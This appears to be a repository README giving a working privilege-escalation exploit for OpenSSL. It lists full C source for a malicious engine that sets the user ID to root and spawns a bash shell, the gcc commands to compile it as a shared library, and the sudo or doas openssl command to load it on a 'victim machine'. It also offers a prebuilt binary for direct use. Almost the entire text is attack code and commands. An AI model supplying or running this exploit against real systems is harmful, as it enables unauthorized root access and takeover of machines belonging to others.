# openssl-privilege-escalation
How to get ROOT with openssl <br>

On kali(attacker), create a file called exploit.c with the following content: <br>
```
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Then execute 2 commands: <br>
`gcc -fPIC -o exploit.o -c exploit.c` <br>
`gcc -shared -o exploit.so -lcrypto exploit.o` <br>

Upload exploit.so to the victim machine then run: <br>
`sudo openssl req -engine ./exploit.so` <br>
(also worked with doas because I have tested it) <br>
I have uploaded the exploit.so, so you can just run the above command without building it <br>
